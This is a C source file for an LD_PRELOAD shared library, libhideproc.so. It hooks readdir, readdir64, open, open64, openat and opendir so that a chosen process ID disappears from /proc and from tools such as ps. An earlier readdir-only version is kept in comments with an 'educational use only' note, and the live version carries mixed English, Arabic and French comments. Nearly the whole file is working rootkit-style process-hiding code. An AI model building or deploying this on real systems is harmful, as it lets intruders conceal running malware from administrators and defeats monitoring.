// #define _GNU_SOURCE
// #include <dlfcn.h>
// #include <dirent.h>
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <unistd.h>
// #include <limits.h>
// #include <sys/types.h>
// #include <sys/stat.h>
// #include <fcntl.h>

// typedef struct dirent dirent_t;
// typedef struct dirent64 dirent64_t;

// /*
//  * LD_PRELOAD library that intercepts readdir/readdir64 and hides entries when
//  * listing /proc. Configuration:
//  *   HIDE_PID  - string of PID to hide (e.g. "1234")
//  *
//  * Build:
//  *   gcc -shared -fPIC -o libhideproc.so hideproc.c -ldl
//  *
//  * Usage (experiment in an isolated VM):
//  *   LD_PRELOAD=./libhideproc.so ps aux
//  *
//  * NOTE: for educational use only. Do not run on systems you don't own.
//  */

// // helper function that gets the process PID from the temp file
// static char* get_process_pid() {
//     char *file_name = "/run/process.pid"; 
//     FILE *f = fopen(file_name, "r");

//     if (!f) {
//         perror("fopen");
//         return NULL;
//     }

//     char buf[64];
//     if (fgets(buf, sizeof(buf), f) == NULL) {
//         if (ferror(f)) perror("fgets");
//         fclose(f);
//         return NULL;
//     }
//     fclose(f);

//     size_t ln = strlen(buf);
//     if (ln && buf[ln-1] == '\n') buf[ln-1] = '\0';

//     char *out = strdup(buf);
//     if (!out) {
//         perror("strdup");
//         return NULL;
//     }

//     return out;
// }

// static dirent_t *(*real_readdir)(DIR *) = NULL;
// static dirent64_t *(*real_readdir64)(DIR *) = NULL;

// static char hide_pid[64] = {0};
// static int initialized = 0;

// static void init_once(void) {
//     if (initialized) return;
//     initialized = 1;

//     real_readdir = dlsym(RTLD_NEXT, "readdir");
//     real_readdir64 = dlsym(RTLD_NEXT, "readdir64");

//     char *hp = get_process_pid();
//     if (hp && *hp && strlen(hp) < sizeof(hide_pid))
//         strcpy(hide_pid, hp);
// }

// /* Helper: get path of DIR* via /proc/self/fd/<fd> */
// static int get_dirpath_from_dirp(DIR *dirp, char *out, size_t out_sz) {
//     int fd = dirfd(dirp);
//     if (fd == -1) return -1;
//     char linkpath[64];
//     snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);
//     ssize_t r = readlink(linkpath, out, out_sz - 1);
//     if (r <= 0) return -1;
//     out[r] = '\0';
//     return 0;
// }

// /* Check whether dirp is /proc (or a path that ends with "/proc") */
// static int dirp_is_proc(DIR *dirp) {
//     char path[PATH_MAX];
//     if (get_dirpath_from_dirp(dirp, path, sizeof(path)) != 0) return 0;
//     /* Some tools can open "/proc" or "/proc/" or mount variants. Check basename. */
//     const char *p = strrchr(path, '/');
//     if (!p) p = path;
//     else p++;
//     return (strcmp(p, "proc") == 0);
// }

// /* Helper: check whether an entry should be hidden. */
// static int should_hide(const char *d_name) {
//     if (hide_pid[0] && strcmp(d_name, hide_pid) == 0) return 1;

//     return 0;
// }

// /* Common loop: call real_readdir until a non-hidden entry or NULL */
// static dirent_t *readdir_filtered(DIR *dirp) {
//     init_once();
//     if (!real_readdir) return NULL;

//     /* If not reading /proc, return normal behavior quickly */
//     if (!dirp_is_proc(dirp)) {
//         return real_readdir(dirp);
//     }

//     dirent_t *d;
//     while ((d = real_readdir(dirp)) != NULL) {
//         if (!should_hide(d->d_name)) return d;
//         /* else skip and continue */
//     }
//     return NULL;
// }

// /* 64-bit variant */
// static dirent64_t *readdir64_filtered(DIR *dirp) {
//     init_once();
//     if (!real_readdir64) return NULL;

//     if (!dirp_is_proc(dirp)) {
//         return real_readdir64(dirp);
//     }

//     dirent64_t *d;
//     while ((d = real_readdir64(dirp)) != NULL) {
//         if (!should_hide(d->d_name)) return d;
//     }
//     return NULL;
// }

// /* Exported symbols */
// dirent_t *readdir(DIR *dirp) {
//     return readdir_filtered(dirp);
// }

// dirent64_t *readdir64(DIR *dirp) {
//     return readdir64_filtered(dirp);
// }
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>
#include <errno.h>

static char hide_pid[64] = {0};
static int initialized = 0;

// poniture to the original function
static int (*real_open)(const char *, int, ...) = NULL;
static int (*real_open64)(const char *, int, ...) = NULL;
static int (*real_openat)(int, const char *, int, ...) = NULL;
static DIR *(*real_opendir)(const char *) = NULL;
static struct dirent *(*real_readdir)(DIR *) = NULL;
static struct dirent64 *(*real_readdir64)(DIR *) = NULL;

__attribute__((constructor))
static void init(void) {
    if (initialized) return;
    initialized = 1;

    // جلب الدوال
    real_open = dlsym(RTLD_NEXT, "open");
    real_open64 = dlsym(RTLD_NEXT, "open64");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_opendir = dlsym(RTLD_NEXT, "opendir");
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    // قراءة PID
    char *p = getenv("HIDE_PID");
    if (!p) {
        FILE *f = fopen("/run/process.pid", "r");
        if (f) {
            fgets(hide_pid, sizeof(hide_pid), f);
            hide_pid[strcspn(hide_pid, "\n")] = 0;
            fclose(f);
        }
    } else {
        strncpy(hide_pid, p, sizeof(hide_pid)-1);
    }

    FILE *log = fopen("/tmp/libhideproc.txt", "a");
    if (log) {
        fprintf(log, "[+] Hiding PID: %s (in process %d)\n", hide_pid[0] ? hide_pid : "NONE", getpid());
        fclose(log);
    }
}

// cette function pour voir si utilisateur demande le path de Hide PID
static int path_contains_pid(const char *path) {
    if (!hide_pid[0]) return 0; // tester existense de PID
    char pid_path[128];
    snprintf(pid_path, sizeof(pid_path), "/proc/%s", hide_pid);
    return (strstr(path, pid_path) != NULL); // return pointure sue le debut de la chaine sucess 0 NULL
}

int open(const char *pathname, int flags, ...) { // the same name 
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (pathname && path_contains_pid(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return real_open(pathname, flags, mode); // call the oiginal OPEN() with paramater
}

int open64(const char *pathname, int flags, ...) {
    if (!real_open64) real_open64 = dlsym(RTLD_NEXT, "open64");
    if (pathname && path_contains_pid(pathname)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return real_open64(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");

    char fullpath[PATH_MAX] = {0};
    if (pathname && pathname[0] != '/') {
        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", dirfd);
        ssize_t len = readlink(fdpath, fullpath, sizeof(fullpath)-1);
        if (len > 0) {
            fullpath[len] = 0;
            strcat(fullpath, "/");
            strcat(fullpath, pathname);
            pathname = fullpath;
        }
    }

    if (pathname && path_contains_pid(pathname)) {
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return real_openat(dirfd, pathname, flags, mode);
}

// --- opendir ---
DIR *opendir(const char *name) {
    if (!real_opendir) real_opendir = dlsym(RTLD_NEXT, "opendir");
    if (name && strstr(name, "/proc/") && hide_pid[0]) {
        char pid_path[128];
        snprintf(pid_path, sizeof(pid_path), "/proc/%s", hide_pid);
        if (strcmp(name, pid_path) == 0) {
            errno = ENOENT;
            return NULL;
        }
    }
    return real_opendir(name);
}

// --- readdir ---
struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *d;
    while ((d = real_readdir(dirp)) != NULL) {
        if (hide_pid[0] && strcmp(d->d_name, hide_pid) == 0) {
            char path[PATH_MAX];
            if (dirfd(dirp) >= 0) {
                char fdpath[64];
                snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", dirfd(dirp));
                if (readlink(fdpath, path, sizeof(path)) > 0 && strstr(path, "/proc")) {
                    continue;
                }
            }
        }
        return d;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *d;
    while ((d = real_readdir64(dirp)) != NULL) {
        if (hide_pid[0] && strcmp(d->d_name, hide_pid) == 0) {
            char path[PATH_MAX];
            if (dirfd(dirp) >= 0) {
                char fdpath[64];
                snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", dirfd(dirp));
                if (readlink(fdpath, path, sizeof(path)) > 0 && strstr(path, "/proc")) {
                    continue;
                }
            }
        }
        return d;
    }
    return NULL;
}